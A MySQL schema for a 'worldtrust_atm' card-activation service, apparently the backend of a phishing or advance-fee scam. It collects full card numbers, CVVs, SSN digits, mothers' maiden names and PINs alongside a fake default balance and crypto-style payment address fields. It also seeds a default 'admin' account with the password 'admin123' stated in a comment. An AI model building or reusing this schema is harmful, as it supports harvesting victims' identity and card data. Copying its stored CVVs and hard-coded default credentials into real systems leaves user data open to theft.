CREATE DATABASE IF NOT EXISTS worldtrust_atm;
USE worldtrust_atm;

-- Activation requests table
CREATE TABLE IF NOT EXISTS activation_requests (
    id INT AUTO_INCREMENT PRIMARY KEY,
    first_name VARCHAR(100) NOT NULL,
    last_name VARCHAR(100) NOT NULL,
    dob DATE NOT NULL,
    email VARCHAR(255) NOT NULL,
    phone VARCHAR(20) NOT NULL,
    account_number VARCHAR(50) NOT NULL,
    street VARCHAR(255) NOT NULL,
    city VARCHAR(100) NOT NULL,
    state VARCHAR(50) NOT NULL,
    zip VARCHAR(20) NOT NULL,
    ssn_last4 VARCHAR(4) NOT NULL,
    maiden_name VARCHAR(100) NOT NULL,
    card_number VARCHAR(16) DEFAULT NULL,
    cvv VARCHAR(3) DEFAULT NULL,
    expiry_date VARCHAR(7) DEFAULT NULL,
    pin_hash VARCHAR(255) DEFAULT NULL,
    balance DECIMAL(10,2) DEFAULT 5000.00,
    payment_method VARCHAR(20) DEFAULT NULL,
    payment_status VARCHAR(20) DEFAULT 'pending',
    payment_address VARCHAR(255) DEFAULT NULL,
    activation_pin VARCHAR(6) DEFAULT NULL,
    activation_token VARCHAR(64) UNIQUE DEFAULT NULL,
    pin_sent_at TIMESTAMP NULL,
    pin_sent_by VARCHAR(50) DEFAULT NULL,
    status VARCHAR(20) DEFAULT 'pending',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    activated_at TIMESTAMP NULL,
    reviewed_at TIMESTAMP NULL,
    reviewed_by VARCHAR(50) DEFAULT NULL,
    admin_notes TEXT DEFAULT NULL,
    INDEX idx_email (email),
    INDEX idx_status (status),
    INDEX idx_payment_status (payment_status),
    INDEX idx_activation_token (activation_token)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- Admin users table
CREATE TABLE IF NOT EXISTS admin_users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    full_name VARCHAR(100) NOT NULL,
    email VARCHAR(255) NOT NULL,
    role VARCHAR(20) DEFAULT 'admin',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_login TIMESTAMP NULL,
    INDEX idx_username (username)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- Insert default admin user (username: admin, password: admin123)
INSERT INTO admin_users (username, password_hash, full_name, email, role) 
VALUES ('admin', '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', 'System Administrator', 'admin@worldtrustatm.com', 'admin')
ON DUPLICATE KEY UPDATE username = username;
